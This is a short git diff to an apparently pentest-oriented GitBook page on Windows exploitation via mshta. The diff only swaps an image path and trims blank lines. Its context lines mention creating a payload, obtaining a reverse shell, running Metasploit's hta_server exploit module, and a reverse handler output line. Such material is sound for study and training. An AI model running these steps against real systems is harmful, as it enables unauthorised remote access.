@@ -36,7 +36,7 @@ Execute again to create our payload, make sure to add the extension to it or Emp
 
 Once here it's up to creativity on how to send this file I will continue with this just for DEMO purposes.
 
-![](<../../.gitbook/assets/image (22).png>)
+![](<../../.gitbook/assets/image (22) (1).png>)
 
 after execution, when get a reverse shell.
 
@@ -63,13 +63,6 @@ msf exploit(windows/misc/hta_server) > exploit
 [*] Started HTTPS reverse handler on https://192.168.216...Copy
 ```
 
-
-
 ## <mark style="color:red;">Other Tools</mark>
 
 {% embed url="https://www.hackingarticles.in/windows-exploitation-mshta" %}
-
-
-
-
-
